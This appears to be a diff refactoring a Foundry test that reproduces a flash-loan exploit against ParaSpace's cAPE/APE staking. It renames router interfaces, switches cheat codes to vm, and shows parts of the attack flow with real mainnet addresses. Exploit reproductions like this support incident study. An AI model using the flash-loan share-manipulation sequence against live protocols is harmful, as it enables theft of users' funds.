@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @Analysis
 // https://twitter.com/BlockSecTeam/status/1636650252844294144
@@ -35,15 +34,13 @@ contract ContractTest is Test {
     IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IParaProxy ParaProxy = IParaProxy(0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee);
-    Uni_Router_V3 Router = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+    IUniswapV3Router Router = IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);
     IAPEStaking APEStaking = IAPEStaking(0x5954aB967Bc958940b7EB73ee84797Dc8a2AFbb9);
     IAaveFlashloan AaveFlashloan = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
     Slave slave;
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     function setUp() public {
-        cheats.createSelectFork("mainnet", 16_845_558);
+        vm.createSelectFork("mainnet", 16_845_558);
         vm.label(address(wstETH), "wstETH");
         vm.label(address(USDC), "USDC");
         vm.label(address(cAPE), "cAPE");
@@ -64,13 +61,10 @@ contract ContractTest is Test {
         );
     }
 
-    function executeOperation(
-        address asset,
-        uint256 amount,
-        uint256 premium,
-        address initator,
-        bytes calldata params
-    ) external returns (bool) {
+    function executeOperation(address asset, uint256 amount, uint256 premium, address initator, bytes calldata params)
+        external
+        returns (bool)
+    {
         wstETH.approve(address(AaveFlashloan), type(uint256).max);
         cAPE.approve(address(ParaProxy), type(uint256).max);
         uint256 _amountOfShare = 1_840_000_000_000_000_000_000_000;
@@ -109,7 +103,7 @@ contract ContractTest is Test {
 
     function SwapwstETHToAPE() internal {
         wstETH.approve(address(Router), type(uint256).max);
-        Uni_Router_V3.ExactInputSingleParams memory _Param1 = Uni_Router_V3.ExactInputSingleParams({
+        IUniswapV3Router.ExactInputSingleParams memory _Param1 = IUniswapV3Router.ExactInputSingleParams({
             tokenIn: address(wstETH),
             tokenOut: address(WETH),
             fee: 500,
@@ -121,7 +115,7 @@ contract ContractTest is Test {
         });
         Router.exactInputSingle(_Param1);
         WETH.approve(address(Router), type(uint256).max);
-        Uni_Router_V3.ExactInputSingleParams memory _Param2 = Uni_Router_V3.ExactInputSingleParams({
+        IUniswapV3Router.ExactInputSingleParams memory _Param2 = IUniswapV3Router.ExactInputSingleParams({
             tokenIn: address(WETH),
             tokenOut: address(APE),
             fee: 3000,
@@ -136,7 +130,7 @@ contract ContractTest is Test {
 
     function WETH_USDCTowstETH(uint256 amount, uint256 premium) internal {
         USDC.approve(address(Router), type(uint256).max);
-        Uni_Router_V3.ExactInputSingleParams memory _Param1 = Uni_Router_V3.ExactInputSingleParams({
+        IUniswapV3Router.ExactInputSingleParams memory _Param1 = IUniswapV3Router.ExactInputSingleParams({
             tokenIn: address(USDC),
             tokenOut: address(WETH),
             fee: 500,
@@ -149,7 +143,7 @@ contract ContractTest is Test {
         WETH.approve(address(Router), type(uint256).max);
         uint256 amountout = amount + premium - wstETH.balanceOf(address(this));
         Router.exactInputSingle(_Param1);
-        Uni_Router_V3.ExactOutputSingleParams memory _Param2 = Uni_Router_V3.ExactOutputSingleParams({
+        IUniswapV3Router.ExactOutputSingleParams memory _Param2 = IUniswapV3Router.ExactOutputSingleParams({
             tokenIn: address(WETH),
             tokenOut: address(wstETH),
             fee: 500,
